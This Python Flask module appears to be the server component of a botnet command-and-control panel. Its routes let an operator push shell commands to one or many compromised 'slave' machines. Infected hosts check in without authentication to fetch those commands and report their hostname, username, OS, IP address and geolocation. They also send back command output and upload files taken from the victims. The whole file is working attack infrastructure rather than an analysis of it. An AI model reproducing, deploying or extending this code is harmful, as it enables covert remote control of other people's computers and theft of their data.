import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from flask import render_template
from werkzeug.utils import secure_filename
import pygeoip
from flask import flash
from flask import redirect
from flask import escape
import cgi

from webui import require_admin
from models import db
from models import Slave
from models import Command


api = Blueprint('api', __name__)
GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)


def geolocation(ip):
    geoloc_str = 'Local'
    info = GEOIP.record_by_addr(ip)
    if info:
        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
    return geoloc_str


@api.route('/massexec', methods=['POST'])
@require_admin
def mass_execute():
    selection = request.form.getlist('selection')
    if 'execute' in request.form:
        for slave_id in selection:
            Slave.query.get(slave_id).push_command(request.form['cmd'])
        flash('Executed "%s" on %s slaves' % (request.form['cmd'], len(selection)))
    elif 'delete' in request.form:
        for slave_id in selection:
            db.session.delete(Slave.query.get(slave_id))
        db.session.commit()
        flash('Deleted %s slaves' % len(selection))
    return redirect(url_for('webui.slave_list'))


@api.route('/<slave_id>/push', methods=['POST'])
@require_admin
def push_command(slave_id):
    slave = Slave.query.get(slave_id)
    if not slave:
        abort(404)
    slave.push_command(request.form['cmdline'])
    return ''


@api.route('/<slave_id>/stdout')
@require_admin
def slave_console(slave_id):
    slave = Slave.query.get(slave_id)
    return render_template('slave_console.html', slave=slave)


@api.route('/<slave_id>/connect', methods=['POST'])
def get_command(slave_id):
    slave = Slave.query.get(slave_id)
    if not slave:
        slave = Slave(slave_id)
        db.session.add(slave)
        db.session.commit()
    # Report basic info about the slave
    info = request.json
    if info:
        if 'platform' in info:
            slave.operating_system = info['platform']
        if 'hostname' in info:
            slave.hostname = info['hostname']
        if 'username' in info:
            slave.username = info['username']
    slave.last_online = datetime.now()
    slave.remote_ip = request.remote_addr
    slave.geolocation = geolocation(slave.remote_ip)
    db.session.commit()
    # Return pending commands for the slave
    cmd_to_run = ''
    cmd = slave.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run


@api.route('/<slave_id>/report', methods=['POST'])
def report_command(slave_id):
    slave = Slave.query.get(slave_id)
    if not slave:
        abort(404)
    out = request.form['output']
    slave.output += cgi.escape(out)
    db.session.add(slave)
    db.session.commit()
    return ''


@api.route('/<slave_id>/upload', methods=['POST'])
def upload(slave_id):
    slave = Slave.query.get(slave_id)
    if not slave:
        abort(404)
    for file in request.files.values():
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
        slave_dir = slave_id
        store_dir = os.path.join(upload_dir, slave_dir)
        filename = secure_filename(file.filename)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=slave_dir + '/' + filename)
        slave.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(slave)
        db.session.commit()
    return ''
